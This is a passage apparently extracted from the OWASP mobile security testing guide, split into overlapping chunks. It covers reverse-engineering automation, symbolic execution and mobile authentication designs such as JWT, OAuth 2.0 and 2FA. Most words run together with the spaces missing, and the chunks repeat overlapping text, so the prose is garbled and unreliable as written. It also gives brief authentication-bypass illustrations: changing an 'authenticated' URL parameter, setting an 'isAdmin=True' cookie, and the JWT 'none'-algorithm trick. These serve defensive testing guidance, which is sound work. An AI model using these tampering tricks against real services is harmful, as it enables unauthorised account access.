doneinseveralways,includingdebuggingAPIs,functionhooks,andKerneltracingfacilities. Again,we’llcovermanyof thesetechniquesintheOS-specific“ReverseEngineeringandTampering”chapters. Advanced Techniques Formorecomplicatedtasks, suchasde-obfuscatingheavilyobfuscatedbinaries, youwon’tgetfarwithoutautomating certainpartsoftheanalysis. Forexample,understandingandsimplifyingacomplexcontrolflowgraphbasedonmanual analysisinthedisassemblerwouldtakeyouyears(andmostlikelydriveyoumadlongbeforeyou’redone). Instead,you canaugmentyourworkflowwithcustommadetools. Fortunately,moderndisassemblerscomewithscriptingandexten- sionAPIs,andmanyusefulextensionsareavailableforpopulardisassemblers. Therearealsoopensourcedisassembling enginesandbinaryanalysisframeworks. Asalwaysinhacking,theanything-goesruleapplies: simplyusewhateverismostefficient. Everybinaryisdifferent,and allreverseengineershavetheirownstyle. Often,thebestwaytoachieveyourgoalistocombineapproaches(suchas emulator-based tracing and symbolic execution). To get started, pick a good disassembler and/or reverse engineering framework,thengetcomfortablewiththeirparticularfeaturesandextensionAPIs. Ultimately,thebestwaytogetbetter istogethands-onexperience. Dynamic Binary Instrumentation Anotherusefulapproachfornativebinariesisdynamicbinaryinstrumentations(DBI).Instrumentationframeworkssuch as Valgrind and PIN support fine-grained instruction-level tracing of single processes. This is accomplished by insert- ing dynamically generated code at runtime. Valgrind compiles fine on Android, and pre-built binaries are available for download. TheValgrindREADMEincludesspecificcompilationinstructionsforAndroid. Emulation-based Dynamic Analysis Emulationisanimitationofacertaincomputerplatformorprogrambeingexecutedindifferentplatformorwithinanother program. Thesoftwareorhardwareperformingthisimitationiscalledanemulator. Emulatorsprovideamuchcheaper alternativetoanactualdevice,whereausercanmanipulateitwithoutworryingaboutdamagingthedevice. Thereare multipleemulatorsavailableforAndroid,butforiOStherearepracticallynoviableemulatorsavailable. iOSonlyhasa simulator,shippedwithinXcode. The difference between a simulator and an emulator often causes confusion and leads to use of the two terms inter- changeably, butinrealitytheyaredifferent, speciallyfortheiOSusecase. Anemulatormimicsboththesoftwareand hardwareenvironmentofatargetedplatform. Ontheotherhand,asimulatoronlymimicsthesoftwareenvironment. QEMUbasedemulatorsforAndroidtakeintoconsiderationtheRAM,CPU,batteryperformanceetc(hardwarecomponents) whilerunninganapplication,butinaniOSsimulatorthishardwarecomponentbehaviourisnottakenintoconsideration atall. TheiOSsimulatorevenlackstheimplementationoftheiOSkernel,asaresultifanapplicationisusingsyscallsit cannotbeexecutedinthissimulator. Insimplewords,anemulatorisamuchcloserimitationofthetargetedplatform,whileasimulatormimicsonlyapartof it. Runninganappintheemulatorgivesyoupowerfulwaystomonitorandmanipulateitsenvironment. Forsomereverse engineeringtasks,especiallythosethatrequirelow-levelinstructiontracing,emulationisthebest(oronly)choice. Un- fortunately,thistypeofanalysisisonlyviableforAndroid,becausenofreeoropensourceemulatorexistsforiOS(the iOSsimulatorisnotanemulator,andappscompiledforaniOSdevicedon’trunonit). TheonlyiOSemulatoravailable isacommercialSaaSsolution-Corellium. We’llprovideanoverviewofpopularemulation-basedanalysisframeworksfor Androidinthe“TamperingandReverseEngineeringonAndroid”chapter. 47\\nCustom Tooling with Reverse Engineering Frameworks EventhoughmostprofessionalGUI-baseddisassemblersfeaturescriptingfacilitiesandextensibility,theyaresimplynot well-suitedtosolvingparticularproblems. Reverseengineeringframeworksallowyoutoperformandautomateanykind ofreversingtaskwithoutdependingonaheavy-weightGUI.Notably,mostreversingframeworksareopensourceand/or availableforfree. Popularframeworkswithsupportformobilearchitecturesincluderadare2andAngr. Example: Program Analysis with Symbolic/Concolic Execution In the late 2000s, testing based on symbolic execution has become a popular way to identify security vulnerabilities. Symbolic “execution” actually refers to the process of representing possible paths through a program as formulas in first-order logic. Satisfiability Modulo Theories (SMT) solvers are used to check the satisfiability of these formulas and provide solutions, including concrete values of the variables needed to reach a certain point of execution on the path correspondingtothesolvedformula. Insimplewords,symbolicexecutionismathematicallyanalyzingaprogramwithoutexecutingit. Duringanalysis,each unknowninputisrepresentedasamathematicalvariable(asymbolicvalue),andhencealltheoperationsperformedon thesevariablesarerecordedasatreeofoperations(aka. AST(abstractsyntaxtree),fromcompilertheory). TheseASTs can be translated into so-called constraints that will be interpreted by a SMT solver. In the end of this analysis, a final mathematicalequationisobtained,inwhichthevariablesaretheinputswhosevaluesarenotknown. SMTsolversare specialprogramswhichsolvetheseequationstogivepossiblevaluesfortheinputvariablesgivenafinalstate. Toillustratethis,imagineafunctionwhichtakesoneinput(x)andmultipliesitbythevalueofasecondinput(y). Finally, thereisanifconditionwhichchecksifthevaluecalculatedisgreaterthanthevalueofanexternalvariable(z),andreturns “success”iftrue,elsereturns“fail”. Theequationforthisoperationwillbe(x * y) > z. Ifwewantthefunctiontoalwaysreturn“success”(finalstate),wecantelltheSMTsolvertocalculatethevaluesforx andy(inputvariables)whichsatisfythecorrespondingequation. Asisthecaseforglobalvariables,theirvaluecanbe changedfromoutsidethisfunction,whichmayleadtodifferentoutputswheneverthisfunctionisexecuted. Thisaddsto additionalcomplexityindeterminingcorrectsolution. Internally SMT solvers use various equation solving techniques to generate solution for such equations. Some of the techniquesareveryadvancedandtheirdiscussionisbeyondthescopeofthisbook. In a real world situation, the functions are much more complex than the above example. The increased complexity of thefunctionscanposesignificantchallengesforclassicalsymbolicexecution. Someofthechallengesaresummarised below: • Loopsandrecursionsinaprogrammayleadtoinfiniteexecutiontree. • Multipleconditionalbranchesornestedconditionsmayleadtopathexplosion. • ComplexequationsgeneratedbysymbolicexecutionmaynotbesolvablebySMTsolversbecauseoftheirlimita- tions. • Programisusingsystemcalls,librarycallsornetworkeventswhichcannotbehandledbysymbolicexecution. Toovercomethesechallenges,typically,symbolicexecutioniscombinedwithothertechniquessuchasdynamicexecution (also called concrete execution) to mitigate the path explosion problem specific to classical symbolic execution. This combinationofconcrete(actual)andsymbolicexecutionisreferredtoasconcolicexecution(thenameconcolicstems fromconcreteandsymbolic),sometimesalsocalledasdynamicsymbolicexecution. To visualize this, in the above example, we can",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 42
    }
  },
  {
    "text": "more complex than the above example. The increased complexity of thefunctionscanposesignificantchallengesforclassicalsymbolicexecution. Someofthechallengesaresummarised below: • Loopsandrecursionsinaprogrammayleadtoinfiniteexecutiontree. • Multipleconditionalbranchesornestedconditionsmayleadtopathexplosion. • ComplexequationsgeneratedbysymbolicexecutionmaynotbesolvablebySMTsolversbecauseoftheirlimita- tions. • Programisusingsystemcalls,librarycallsornetworkeventswhichcannotbehandledbysymbolicexecution. Toovercomethesechallenges,typically,symbolicexecutioniscombinedwithothertechniquessuchasdynamicexecution (also called concrete execution) to mitigate the path explosion problem specific to classical symbolic execution. This combinationofconcrete(actual)andsymbolicexecutionisreferredtoasconcolicexecution(thenameconcolicstems fromconcreteandsymbolic),sometimesalsocalledasdynamicsymbolicexecution. To visualize this, in the above example, we can obtain the value of the external variable by performing further reverse engineeringorbydynamicallyexecutingtheprogramandfeedingthisinformationintooursymbolicexecutionanalysis. Thisextrainformationwillreducethecomplexityofourequationsandmayproducemoreaccurateanalysisresults. To- getherwithimprovedSMTsolversandcurrenthardwarespeeds,concolicexecutionallowstoexplorepathsinmedium-size softwaremodules(i.e.,ontheorderof10KLOC). Inaddition,symbolicexecutionalsocomesinhandyforsupportingde-obfuscationtasks,suchassimplifyingcontrolflow graphs. For example, Jonathan Salwan and Romain Thomas have shown how to reverse engineer VM-based software protections using Dynamic Symbolic Execution [#salwan] (i.e., using a mix of actual execution traces, simulation, and symbolicexecution). In the Android section, you’ll find a walkthrough for cracking a simple license check in an Android application using symbolicexecution. 48\\nReferences • [#vadla]OleAndréVadlaRavnås, Anatomyofacodetracer-https://medium.com/@oleavr/anatomy-of-a-code- tracer-b081aadb0df8 • [#salwan] Jonathan Salwan and Romain Thomas, How Triton can help to reverse virtual machine based software protections-https://drive.google.com/file/d/1EzuddBA61jEMy8XbjQKFF3jyoKwW7tLq/view?usp=sharing 49\\nMobile App Authentication Architectures Authenticationandauthorizationproblemsareprevalentsecurityvulnerabilities. Infact, theyconsistentlyranksecond highestintheOWASPTop10. Mostmobileappsimplementsomekindofuserauthentication. Eventhoughpartoftheauthenticationandstatemanage- mentlogicisperformedbythebackendservice,authenticationissuchanintegralpartofmostmobileapparchitectures thatunderstandingitscommonimplementationsisimportant. SincethebasicconceptsareidenticaloniOSandAndroid,we’lldiscussprevalentauthenticationandauthorizationarchi- tecturesandpitfallsinthisgenericguide. OS-specificauthenticationissues,suchaslocalandbiometricauthentication, willbediscussedintherespectiveOS-specificchapters. General Assumptions Appropriate Authentication is in Place Performthefollowingstepswhentestingauthenticationandauthorization: • Identifytheadditionalauthenticationfactorstheappuses. • Locateallendpointsthatprovidecriticalfunctionality. • Verifythattheadditionalfactorsarestrictlyenforcedonallserver-sideendpoints. Authenticationbypassvulnerabilitiesexistwhenauthenticationstateisnotconsistentlyenforcedontheserverandwhen the client can tamper with the state. While the backend service is processing requests from the mobile client, it must consistently enforce authorization checks: verifying that the user is logged in and authorized every time a resource is requested. ConsiderthefollowingexamplefromtheOWASPWebTestingGuide. Intheexample,awebresourceisaccessedthrough aURL,andtheauthenticationstateispassedthroughaGETparameter: http://www.site.com/page.asp?authenticated=no The client can arbitrarily change the GET parameters sent with the request. Nothing prevents the client from simply changingthevalueoftheauthenticatedparameterto“yes”,effectivelybypassingauthentication. Althoughthisisasimplisticexamplethatyouprobablywon’tfindinthewild,programmerssometimesrelyon“hidden” client-side parameters, such as cookies, to maintain authentication state. They assume that these parameters can’t be tampered with. Consider, for example, the following classic vulnerability in Nortel Contact Center Manager. The administrativewebapplicationofNortel’sappliancereliedonthecookie“isAdmin”todeterminewhetherthelogged-in user should be granted administrative privileges. Consequently, it was possible to get admin access by simply setting thecookievalueasfollows: isAdmin=True Security experts used to recommend using session-based authentication and maintaining session data on the server only. Thispreventsanyformofclient-sidetamperingwiththesessionstate. However,thewholepointofusingstateless authenticationinsteadofsession-basedauthenticationistonothavesessionstateontheserver. Instead,stateisstored inclient-sidetokensandtransmittedwitheveryrequest. Inthiscase,seeingclient-sideparameterssuchasisAdminis perfectlynormal. Topreventtamperingcryptographicsignaturesareaddedtoclient-sidetokens. Ofcourse,thingsmaygowrong,andpop- ularimplementationsofstatelessauthenticationhavebeenvulnerabletoattacks. Forexample,thesignatureverification ofsomeJSONWebToken(JWT)implementationscouldbedeactivatedbysettingthesignaturetypeto“None”. 50\\nBest Practices for Passwords Passwordstrengthisakeyconcernwhenpasswordsareusedforauthentication. Thepasswordpolicydefinesrequirements to which end users should adhere. A password policy typically specifies password length, password complexity, and passwordtopologies. A“strong”passwordpolicymakesmanualorautomatedpasswordcrackingdifficultorimpossible. ForfurtherinformationpleaseconsulttheOWASPAuthenticationCheatSheet. General Guidelines on Testing Authentication There’s no one-size-fits-all approach to authentication. When reviewing the authentication architecture of an app, you shouldfirstconsiderwhethertheauthenticationmethod(s)usedareappropriateinthegivencontext. Authenticationcan bebasedononeormoreofthefollowing: • Somethingtheuserknows(password,PIN,pattern,etc.) • Somethingtheuserhas(SIMcard,one-timepasswordgenerator,orhardwaretoken) • Abiometricpropertyoftheuser(fingerprint,retina,voice) The number of authentication procedures implemented by mobile apps depends on the sensitivity of the functions or accessedresources. Refertoindustrybestpracticeswhenreviewingauthenticationfunctions. Username/passwordau- thentication (combined with a reasonable password policy) is generally considered sufficient for apps that have a user loginandaren’tverysensitive. Thisformofauthenticationisusedbymostsocialmediaapps. Forsensitiveapps,addingasecondauthenticationfactorisusuallyappropriate. Thisincludesappsthatprovideaccessto verysensitiveinformation(suchascreditcardnumbers)orallowuserstotransferfunds. Insomeindustries,theseapps mustalsocomplywithcertainstandards. Forexample,financialappshavetoensurecompliancewiththePaymentCard IndustryDataSecurityStandard(PCIDSS),theGrammLeachBlileyAct,andtheSarbanes-OxleyAct(SOX).Compliance considerationsfortheUShealthcaresectorincludetheHealthInsurancePortabilityandAccountabilityAct(HIPAA)and thePatientSafetyRule. Stateful vs. Stateless Authentication You’ll usually find that the mobile app uses HTTP as the transport layer. The HTTP protocol itself is stateless, so there must be a way to associate a user’s subsequent HTTP requests with that user. Otherwise, the user’s log in credentials wouldhavetobesentwitheveryrequest. Also,boththeserverandclientneedtokeeptrackofuserdata(e.g.,theuser’s privilegesorrole). Thiscanbedoneintwodifferentways: • Withstatefulauthentication,auniquesessionidisgeneratedwhentheuserlogsin. Insubsequentrequests,this sessionIDservesasareferencetotheuserdetailsstoredontheserver. ThesessionIDisopaque;itdoesn’tcontain anyuserdata. • With stateless authentication, all user-identifying information is stored in a client-side token. The token can be passed to any server or micro service, eliminating the need",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 43
    }
  },
  {
    "text": "user’s subsequent HTTP requests with that user. Otherwise, the user’s log in credentials wouldhavetobesentwitheveryrequest. Also,boththeserverandclientneedtokeeptrackofuserdata(e.g.,theuser’s privilegesorrole). Thiscanbedoneintwodifferentways: • Withstatefulauthentication,auniquesessionidisgeneratedwhentheuserlogsin. Insubsequentrequests,this sessionIDservesasareferencetotheuserdetailsstoredontheserver. ThesessionIDisopaque;itdoesn’tcontain anyuserdata. • With stateless authentication, all user-identifying information is stored in a client-side token. The token can be passed to any server or micro service, eliminating the need to maintain session state on the server. Stateless authenticationisoftenfactoredouttoanauthorizationserver,whichproduces,signs,andoptionallyencryptsthe tokenuponuserlogin. WebapplicationscommonlyusestatefulauthenticationwitharandomsessionIDthatisstoredinaclient-sidecookie. Al- thoughmobileappssometimesusestatefulsessionsinasimilarfashion,statelesstoken-basedapproachesarebecoming popularforavarietyofreasons: • Theyimprovescalabilityandperformancebyeliminatingtheneedtostoresessionstateontheserver. • Tokensenabledeveloperstodecoupleauthenticationfromtheapp. Tokenscanbegeneratedbyanauthentication server,andtheauthenticationschemecanbechangedseamlessly. Asamobilesecuritytester,youshouldbefamiliarwithbothtypesofauthentication. 51\\nStateful Authentication Stateful(or“session-based”)authenticationischaracterizedbyauthenticationrecordsonboththeclientandserver. The authenticationflowisasfollows: 1. Theappsendsarequestwiththeuser’scredentialstothebackendserver. 2. Theserververifiesthecredentials. Ifthecredentialsarevalid,theservercreatesanewsessionalongwitharandom sessionID. 3. TheserversendstotheclientaresponsethatincludesthesessionID. 4. TheclientsendsthesessionIDwithallsubsequentrequests. TheservervalidatesthesessionIDandretrievesthe associatedsessionrecord. 5. Aftertheuserlogsout,theserver-sidesessionrecordisdestroyedandtheclientdiscardsthesessionID. Whensessionsareimproperlymanaged,theyarevulnerabletoavarietyofattacksthatmaycompromisethesessionofa legitimateuser,allowingtheattackertoimpersonatetheuser. Thismayresultinlostdata,compromisedconfidentiality, andillegitimateactions. BestPractices: Locateanyserver-sideendpointsthatprovidesensitiveinformationorfunctionsandverifytheconsistentenforcementof authorization. Thebackendservicemustverifytheuser’ssessionIDortokenandmakesurethattheuserhassufficient privilegestoaccesstheresource. IfthesessionIDortokenismissingorinvalid,therequestmustberejected. Makesurethat: • SessionIDsarerandomlygeneratedontheserverside. • TheIDscan’tbeguessedeasily(useproperlengthandentropy). • SessionIDsarealwaysexchangedoversecureconnections(e.g.HTTPS). • Themobileappdoesn’tsavesessionIDsinpermanentstorage. • Theserververifiesthesessionwheneverausertriestoaccessprivilegedapplicationelements(asessionIDmust bevalidandmustcorrespondtotheproperauthorizationlevel). • Thesessionisterminatedontheserversideandsessioninformationdeletedwithinthemobileappafterittimes outortheuserlogsout. Authenticationshouldn’tbeimplementedfromscratchbutbuiltontopofprovenframeworks. Manypopularframeworks provide ready-made authentication and session management functionality. If the app uses framework APIs for authen- tication, check the framework security documentation for best practices. Security guides for common frameworks are availableatthefollowinglinks: • Spring(Java) • Struts(Java) • Laravel(PHP) • RubyonRails • ASP.Net Agreatresourcefortestingserver-sideauthenticationistheOWASPWebTestingGuide,specificallytheTestingAuthenti- cationandTestingSessionManagementchapters. Stateless Authentication Token-basedauthenticationisimplementedbysendingasignedtoken(verifiedbytheserver)witheachHTTPrequest. The mostcommonlyusedtokenformatistheJSONWebToken,definedinRFC7519. AJWTmayencodethecompletesession stateasaJSONobject. Therefore,theserverdoesn’thavetostoreanysessiondataorauthenticationinformation. JWTtokensconsistofthreeBase64Url-encodedpartsseparatedbydots. TheTokenstructureisasfollows: base64UrlEncode(header).base64UrlEncode(payload).base64UrlEncode(signature) ThefollowingexampleshowsaBase64Url-encodedJSONWebToken: 52\\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikpva G4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ Theheadertypicallyconsistsoftwoparts: thetokentype,whichisJWT,andthehashingalgorithmbeingusedtocompute thesignature. Intheexampleabove,theheaderdecodesasfollows: {\"alg\":\"HS256\",\"typ\":\"JWT\"} The second part of the token is the payload, which contains so-called claims. Claims are statements about an entity (typically,theuser)andadditionalmetadata. Forexample: {\"sub\":\"1234567890\",\"name\":\"JohnDoe\",\"admin\":true} ThesignatureiscreatedbyapplyingthealgorithmspecifiedintheJWTheadertotheencodedheader,encodedpayload, andasecretvalue. Forexample,whenusingtheHMACSHA256algorithmthesignatureiscreatedinthefollowingway: HMACSHA256(base64UrlEncode(header)+\".\"+base64UrlEncode(payload),secret) Note that the secret is shared between the authentication server and the backend service - the client does not know it. This proves that the token was obtained from a legitimate authentication service. It also prevents the client from tamperingwiththeclaimscontainedinthetoken. BestPractices: VerifythattheimplementationadherestoJWTbestpractices: • VerifythattheHMACischeckedforallincomingrequestscontainingatoken. • VerifythattheprivatesigningkeyorHMACsecretkeyisneversharedwiththeclient. Itshouldbeavailableforthe issuerandverifieronly. • Verify that no sensitive data, such as personal identifiable information, is embedded in the JWT. For example, by decodingthebase64-encodedJWTandfindoutwhatkindofdataittransmitsandwhetherthatdataisencrypted. If,forsomereason,thearchitecturerequirestransmissionofsuchinformationinthetoken,makesurethatpayload encryptionisbeingapplied. SeethesampleJavaimplementationontheOWASPJWTCheatSheet. • Makesurethatreplayattacksareaddressedwiththejti(JWTID)claim,whichgivestheJWTauniqueidentifier. • Make sure that cross service relay attacks are addressed with the aud (audience) claim, which defines for which applicationthetokenisentitled. • Verifythattokensarestoredsecurelyonthemobilephone,with,forexample,KeyChain(iOS)orKeyStore(Android). • Verifythatthehashingalgorithmisenforced. Acommonattackincludesalteringthetokentouseanemptysignature (e.g.,signature=““)andsetthesigningalgorithmtonone,indicatingthat”theintegrityofthetokenhasalready beenverified”. Somelibrariesmighttreattokenssignedwiththenonealgorithmasiftheywerevalidtokenswith verifiedsignatures,sotheapplicationwilltrustalteredtokenclaims. • Verifythattokensincludean“exp”expirationclaimandthebackenddoesn’tprocessexpiredtokens. Acommon methodofgrantingtokenscombinesaccesstokensandrefreshtokens. Whentheuserlogsin,thebackendservice issuesashort-livedaccesstokenandalong-livedrefreshtoken. Theapplicationcanthenusetherefreshtokento obtainanewaccesstoken,iftheaccesstokenexpires. TherearetwodifferentBurpPluginsthatcanhelpyoufortestingthevulnerabilitieslistedabove: • JSONWebTokenAttacker • JSONWebTokens Also,makesuretocheckouttheOWASPJWTCheatSheetforadditionalinformation. OAuth 2.0 OAuth2.0isanauthorizationframeworkthatenablesthird-partyapplicationstoobtainlimitedaccesstouseraccounts onremoteHTTPservicessuchasAPIsandweb-enabledapplications. CommonusesforOAuth2include: 53\\n• Gettingpermissionfromtheusertoaccessanonlineserviceusingtheiraccount. • Authenticatingtoanonlineserviceonbehalfoftheuser. • Handlingauthenticationerrors. AccordingtoOAuth2.0,amobileclientseekingaccesstoauser’sresourcesmustfirstasktheusertoauthenticateagainst anauthenticationserver. Withtheusers’approval,theauthorizationserverthenissuesatokenthatallowstheapptoact onbehalfoftheuser. NotethattheOAuth2specificationdoesn’tdefineanyparticularkindofauthenticationoraccess tokenformat. Protocol Overview OAuth2.0definesfourroles: • ResourceOwner: theaccountowner • Client: theapplicationthatwantstoaccesstheuser’saccountwiththeaccesstokens • ResourceServer: hoststheuseraccounts • AuthorizationServer: verifiesuseridentityandissuesaccesstokenstotheapplication Note: The API fulfills both the Resource Owner and Authorization Server roles. Therefore, we will refer to both as the API. Hereisamoredetailedexplanationofthestepsinthediagram: 1. Theapplicationrequestsuserauthorizationtoaccessserviceresources. 2. If the user authorizes the request, the application receives an authorization grant. The authorization grant may takeseveralforms(explicit,implicit,etc.). 3. The application requests an access token from the authorization server (API) by presenting authentication of its ownidentityalongwiththeauthorizationgrant. 4. Iftheapplicationidentityisauthenticatedandtheauthorizationgrantisvalid,theauthorizationserver(API)issues anaccesstokentotheapplication,completingtheauthorizationprocess. Theaccesstokenmayhaveacompanion refreshtoken. 5. Theapplicationrequeststheresourcefromtheresourceserver(API)andpresentstheaccesstokenforauthentica- tion. Theaccesstokenmaybeusedinseveralways(e.g.,asabearertoken). 6. Iftheaccesstokenisvalid,theresourceserver(API)servestheresourcetotheapplication. InOAuth2,theuseragentistheentitythatperformstheauthentication. OAuth2authenticationcanbeperformedeither throughanexternaluseragent(e.g.ChromeorSafari)orintheappitself(e.g.throughaWebViewembeddedintothe apporanauthenticationlibrary). Noneofthetwomodesisintrinsically“better”thantheother. Thechoicedependson theapp’sspecificusecaseandthreatmodel. External User Agent: Usinganexternaluseragent isthemethodofchoiceforappsthatneedtointeractwithsocial mediaaccounts(Facebook,Twitter,etc.). Advantagesofthismethodinclude: 54\\n• The user’s credentials are never directly exposed to the app. This guarantees that the app cannot obtain the credentialsduringtheloginprocess(“credentialphishing”). • Almostnoauthenticationlogicmustbeaddedtotheappitself,preventingcodingerrors. Onthenegativeside,thereisnowaytocontrolthebehaviorofthebrowser(e.g.toactivatecertificatepinning). Embedded User Agent: Usinganembeddeduseragent isthemethodofchoiceforappsthatneedtooperatewithin a closed ecosystem, for example to interact with corporate accounts. For example, consider a banking app that uses OAuth2toretrieveanaccesstokenfromthebank’sauthenticationserver,whichisthenusedtoaccessanumberofmicro services. Inthatcase,credentialphishingisnotaviablescenario. Itislikelypreferabletokeeptheauthenticationprocess inthe(hopefully)carefullysecuredbankingapp,insteadofplacingtrustonexternalcomponents. Best Practices Foradditionalbestpracticesanddetailedinformationpleaserefertothefollowingsourcedocuments: • RFC6749-TheOAuth2.0AuthorizationFramework(October2012) • RFC8252-OAuth2.0forNativeApps(October2017) • RFC6819-OAuth2.0ThreatModelandSecurityConsiderations(January2013) Someofthebestpracticesincludebutarenotlimitedto: •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 44
    }
  },
  {
    "text": "guarantees that the app cannot obtain the credentialsduringtheloginprocess(“credentialphishing”). • Almostnoauthenticationlogicmustbeaddedtotheappitself,preventingcodingerrors. Onthenegativeside,thereisnowaytocontrolthebehaviorofthebrowser(e.g.toactivatecertificatepinning). Embedded User Agent: Usinganembeddeduseragent isthemethodofchoiceforappsthatneedtooperatewithin a closed ecosystem, for example to interact with corporate accounts. For example, consider a banking app that uses OAuth2toretrieveanaccesstokenfromthebank’sauthenticationserver,whichisthenusedtoaccessanumberofmicro services. Inthatcase,credentialphishingisnotaviablescenario. Itislikelypreferabletokeeptheauthenticationprocess inthe(hopefully)carefullysecuredbankingapp,insteadofplacingtrustonexternalcomponents. Best Practices Foradditionalbestpracticesanddetailedinformationpleaserefertothefollowingsourcedocuments: • RFC6749-TheOAuth2.0AuthorizationFramework(October2012) • RFC8252-OAuth2.0forNativeApps(October2017) • RFC6819-OAuth2.0ThreatModelandSecurityConsiderations(January2013) Someofthebestpracticesincludebutarenotlimitedto: • Useragent: – Theusershouldhaveawaytovisuallyverifytrust(e.g.,TransportLayerSecurity(TLS)confirmation,website mechanisms). – Topreventman-in-the-middleattacks,theclientshouldvalidatetheserver’sfullyqualifieddomainnamewith thepublickeytheserverpresentedwhentheconnectionwasestablished. • Typeofgrant: – Onnativeapps,codegrantshouldbeusedinsteadofimplicitgrant. – Whenusingcodegrant,PKCE(ProofKeyforCodeExchange)shouldbeimplementedtoprotectthecodegrant. Makesurethattheserveralsoimplementsit. – Theauth“code”shouldbeshort-livedandusedimmediatelyafteritisreceived. Verifythatauthcodesonly resideontransientmemoryandaren’tstoredorlogged. • Clientsecrets: – Shared secrets should not be used to prove the client’s identity because the client could be impersonated (“client_id”alreadyservesasproof). Iftheydouseclientsecrets,besurethattheyarestoredinsecurelocal storage. • End-Usercredentials: – Securethetransmissionofend-usercredentialswithatransport-layermethod,suchasTLS. • Tokens: – Keepaccesstokensintransientmemory. – Accesstokensmustbetransmittedoveranencryptedconnection. – Reducethescopeanddurationofaccesstokenswhenend-to-endconfidentialitycan’tbeguaranteedorthe tokenprovidesaccesstosensitiveinformationortransactions. – Rememberthatanattackerwhohasstolentokenscanaccesstheirscopeandallresourcesassociatedwith themiftheappusesaccesstokensasbearertokenswithnootherwaytoidentifytheclient. – Storerefreshtokensinsecurelocalstorage;theyarelong-termcredentials. User Logout Failingtodestroytheserver-sidesessionisoneofthemostcommonlogoutfunctionalityimplementationerrors. Thiserror keepsthesessionortokenalive,evenaftertheuserlogsoutoftheapplication. Anattackerwhogetsvalidauthentication informationcancontinuetouseitandhijackauser’saccount. 55\\nManymobileappsdon’tautomaticallylogusersout. Therecanbevariousreasons,suchas: becauseitisinconvenient for customers, or because of decisions made when implementing stateless authentication. The application should still havealogoutfunction,anditshouldbeimplementedaccordingtobestpractices,destroyingalllocallystoredtokensor sessionidentifiers. Ifsessioninformationisstoredontheserver,itshouldbedestroyedbysendingalogoutrequesttothatserver. Incaseof ahigh-riskapplication,tokensshouldbeinvalidated. Notremovingtokensorsessionidentifierscanresultinunauthorized accesstotheapplicationincasethetokensareleaked. Notethatothersensitivetypesofinformationshouldberemoved aswell,asanyinformationthatisnotproperlyclearedmaybeleakedlater,forexampleduringadevicebackup. Herearedifferentexamplesofsessionterminationforproperserver-sidelogout: • Spring(Java) • RubyonRails • PHP Ifaccessandrefreshtokensareusedwithstatelessauthentication,theyshouldbedeletedfromthemobiledevice. The refreshtokenshouldbeinvalidatedontheserver. TheOWASPWebTestingGuide(WSTG-SESS-06)includesadetailedexplanationandmoretestcases. Supplementary Authentication Authenticationschemesaresometimessupplementedbypassivecontextualauthentication,whichcanincorporate: • Geolocation • IPaddress • Timeofday • Thedevicebeingused Ideally, in such a system the user’s context is compared to previously recorded data to identify anomalies that might indicateaccountabuseorpotentialfraud. Thisprocessistransparenttotheuser,butcanbecomeapowerfuldeterrent toattackers. Two-factor Authentication Two-factor authentication (2FA) is standard for apps that allow users to access sensitive functions and data. Common implementationsuseapasswordforthefirstfactorandanyofthefollowingasthesecondfactor: • One-timepasswordviaSMS(SMS-OTP) • One-timecodeviaphonecall • Hardwareorsoftwaretoken • PushnotificationsincombinationwithPKIandlocalauthentication Whateveroptionisused,italwaysmustbeenforcedandverifiedontheserver-sideandneveronclient-side. Otherwise the2FAcanbeeasilybypassedwithintheapp. The2FAcanbeperformedatloginorlaterintheuser’ssession. For example, after logging in to a banking app with a username and PIN, the user is authorized to perform non- sensitive tasks. Once the user attempts to execute a bank transfer, the second factor (“step-up authentication”) mustbepresented. BestPractices: • Don’trollyourown2FA:Therearevarioustwo-factorauthenticationmechanismsavailablewhichcanrangefrom third-partylibraries,usageofexternalappstoselfimplementedchecksbythedevelopers. • Useshort-livedOTPs: AOTPshouldbevalidforonlyacertainamountoftime(usually30seconds)andafterkeying intheOTPwronglyseveraltimes(usually3times)theprovidedOTPshouldbeinvalidatedandtheusershouldbe redirectedtothelandingpageorloggedout. • Storetokenssecurely: Topreventthesekindofattacks,theapplicationshouldalwaysverifysomekindofusertoken orotherdynamicinformationrelatedtotheuserthatwaspreviouslysecurelystored(e.g.intheKeychain/KeyStore). 56\\nSMS-OTP Althoughone-timepasswords(OTP)sentviaSMSareacommonsecondfactorfortwo-factorauthentication,thismethod has its shortcomings. In 2016, NIST suggested: “Dueto the risk that SMS messages may be intercepted or redirected, implementersofnewsystemsSHOULDcarefullyconsideralternativeauthenticators.”. Belowyouwillfindalistofsome relatedthreatsandsuggestionstoavoidsuccessfulattacksonSMS-OTP. Threats: • WirelessInterception: TheadversarycaninterceptSMSmessagesbyabusingfemtocellsandotherknownvulnera- bilitiesinthetelecommunicationsnetwork. • Trojans: InstalledmaliciousapplicationswithaccesstotextmessagesmayforwardtheOTPtoanothernumberor backend. • SIMSWAPAttack: Inthisattack,theadversarycallsthephonecompany,orworksforthem,andhasthevictim’s numbermovedtoaSIMcardownedbytheadversary. Ifsuccessful,theadversarycanseetheSMSmessageswhich aresenttothevictim’sphonenumber. Thisincludesthemessagesusedinthetwo-factorauthentication. • VerificationCodeForwardingAttack: Thissocialengineeringattackreliesonthetrusttheusershaveinthecompany providingtheOTP.Inthisattack,theuserreceivesacodeandislateraskedtorelaythatcodeusingthesamemeans inwhichitreceivedtheinformation. • Voicemail: Sometwo-factorauthenticationschemesallowtheOTPtobesentthroughaphonecallwhenSMSisno longerpreferredoravailable. Manyofthesecalls,ifnotanswered,sendtheinformationtovoicemail. Ifanattacker wasabletogainaccesstothevoicemail,theycouldalsousetheOTPtogainaccesstoauser’saccount. YoucanfindbelowseveralsuggestionstoreducethelikelihoodofexploitationwhenusingSMSforOTP: • Messaging: WhensendinganOTPviaSMS,besuretoincludeamessagethatletstheuserknow1)whattodoif theydidnotrequestthecode2)yourcompanywillnevercallortextthemrequestingthattheyrelaytheirpassword orcode. • Dedicated Channel: When using the OS push notification feature (APN on iOS and FCM on Android), OTPs can be sent securely to a registered application. This information is, compared to SMS, not accessible by other applications. AlternativelyofaOTPthepushnotificationcouldtriggerapop-uptoapprovetherequestedaccess. • Entropy: Use authenticators with high entropy to make OTPs harder to crack or guess and use 